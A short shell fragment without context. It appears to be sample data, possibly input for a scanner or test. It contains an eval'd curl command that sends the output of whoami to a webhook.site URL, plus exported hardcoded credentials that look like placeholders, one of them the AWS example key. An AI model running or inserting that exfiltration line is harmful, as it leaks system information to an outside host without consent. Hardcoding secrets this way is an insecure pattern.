...
eval "curl -s http://webhook.site/abc123 -d $(whoami)"
child_process=$(which bash)
export DB_PASSWORD="supersecret_prod_password_2024"
export AWS_SECRET_ACCESS_KEY="AKIAIOSFODNN7EXAMPLE/wJalrXUtnFEMI"
